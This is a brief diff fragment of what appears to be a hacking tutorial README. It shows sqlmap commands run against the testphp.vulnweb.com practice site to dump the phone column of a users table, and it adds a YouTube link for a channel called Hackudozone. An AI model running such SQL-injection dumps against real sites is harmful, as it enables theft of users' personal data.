@@ -25,3 +25,4 @@ sqlmap -u http://testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart -T users
 sqlmap -u http://testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart -T users -C phone --dump    #(show phone no.)
 
 for practical video go to my youtube channel @Hackudozone
+or click on link https://youtu.be/TzmHcVbATqg
